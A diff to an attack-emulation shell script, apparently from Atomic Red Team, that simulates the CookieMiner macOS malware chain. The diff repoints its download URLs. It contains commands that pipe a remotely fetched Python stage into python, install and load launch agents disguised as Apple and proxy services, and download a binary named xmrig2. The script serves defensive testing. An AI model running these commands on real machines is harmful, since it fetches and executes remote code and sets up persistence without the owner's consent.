@@ -21,9 +21,9 @@ zip -r interestingsafaricookies.zip ${OUTPUT}
 #   Tactic: Exfiltration
 #   Technique: T1048 - Exfiltration Over Alternative Protocol
 #   Simulate network connection for exfiltration
-curl https://atomicredteam.io
+curl https://atomicredteam.io > /dev/null
 
-curl --silent https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py || wget -q -O- https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py | python - ``
+curl --silent https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py || wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py | python - ``
 
 #   Tactic: Discovery
 #   Technique: T1083 - File and Directory Discovery
@@ -34,14 +34,14 @@ cp interestingfiles.txt ${OUTPUT}/interestingfiles.txt
 #   Technique: T1159 - Launch Agent
 mkdir -p ~/Library/LaunchAgents
 cd ~/Library/LaunchAgents
-curl --silent -o com.apple.rig2.plist https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-payload-launchagent.plist
-curl --silent -o com.proxy.initialize.plist https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-backdoor-launchagent.plist
+curl --silent -o com.apple.rig2.plist https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-payload-launchagent.plist
+curl --silent -o com.proxy.initialize.plist https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-backdoor-launchagent.plist
 launchctl load -w com.apple.rig2.plist
 launchctl load -w com.proxy.initialize.plist
 
 
 cd /Users/Shared
-curl --silent -o xmrig2 https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/atomic-hello.macos
+curl --silent -o xmrig2 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello.macos
 
 #   Tactic: Defense Evasion
 #   Technique: T1222 - File Permissions Modification
